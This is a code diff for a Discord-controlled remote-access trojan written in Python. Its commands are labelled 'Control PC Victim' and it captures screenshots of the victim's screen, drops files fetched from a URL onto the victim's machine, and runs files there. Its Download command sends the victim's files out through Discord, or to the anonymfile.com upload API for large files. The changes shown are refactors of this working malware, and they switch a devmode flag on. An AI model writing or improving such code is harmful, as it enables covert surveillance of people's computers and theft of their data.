@@ -19,7 +19,7 @@ os.system('cls')
 pc = Info()
 ip = pc.IP()
 PREFIX = '>'
-devmode = False
+devmode = True
 client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())
 
 def create_uuid_from_string(val: str):
@@ -119,7 +119,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
 		snapshot.save(image_path)
 		file = discord.File(image_path, filename="sc.png")
-		await ctx.reply(content = '', file=file)
+		task_send = asyncio.create_task(ctx.reply(file=file))
+		done, pendding = await asyncio.wait(task_send)
+		del snapshot, image_path, file, task_send, done, pendding
 
 	@commands.command(aliases=["up", "u"], brief='Upload File to PC Victim', description='Upload File to PC Victim')
 	async def Upload(self, ctx, ID: str, url: str, path_file: str = '.',):
@@ -131,7 +133,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 			parse = urlparse(url)
 			filename = os.path.basename(parse.path)
 			open(f'{path_file}/{filename}', "wb").write(response.content)
-			await SendOutput(ctx, f"Uploaded File {path_file}/{filename}")
+			task_send_output = asyncio.create_task(SendOutput(ctx, f"Uploaded File {path_file}/{filename}"))
+			done, pendding = await asyncio.wait(task_send_output)
 
 		threading.Thread(target = upload).start()
 
@@ -139,27 +142,26 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def Download(self, ctx, ID: str, path_file: str = '.',):
 		if not CheckID(ID):
 			return
+
 		if not os.path.exists(path_file):
 			await SendOutput(ctx, f"Not Found File {path_file}")
 			return
-		def download():
-			if os.path.getsize(path_file) < 25000000:
-				filename = os.path.basename(path_file)
-				file = discord.File(path_file, filename=filename)
-				await SendOutput(ctx, f"Upload File {filename} Success")
-				await ctx.send(file=file)
-			else:
-				filename = os.path.basename(path_file)
-				file = {"file": open(path_file, 'rb')}
-				r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
-				json_r = json.loads(r.text)
-				if not json_r['status']:
-					await SendOutput(ctx, f"Upload File {path_file} To Anonymfile Failed")
-					return
-				url_file = json_r['data']['file']['url']['full']
-				await SendOutput(ctx, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")
-
-		threading.Thread(target = download).start()
+		if os.path.getsize(path_file) < 25000000:
+			filename = os.path.basename(path_file)
+			file = discord.File(path_file, filename=filename)
+			await SendOutput(ctx, f"Uploading File {filename}")
+			task_send = asyncio.create_task(ctx.send(file=file))
+			done, pendding = await asyncio.wait(task_send)
+		else:
+			filename = os.path.basename(path_file)
+			file = {"file": open(path_file, 'rb')}
+			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
+			json_r = json.loads(r.text)
+			if not json_r['status']:
+				await SendOutput(ctx, f"Upload File {path_file} To Anonymfile Failed")
+				return
+			url_file = json_r['data']['file']['url']['full']
+			await SendOutput(ctx, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")
 
 	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
 	async def Run(self, ctx, ID: str,  method = 'cmd', path_file: str = '.'):
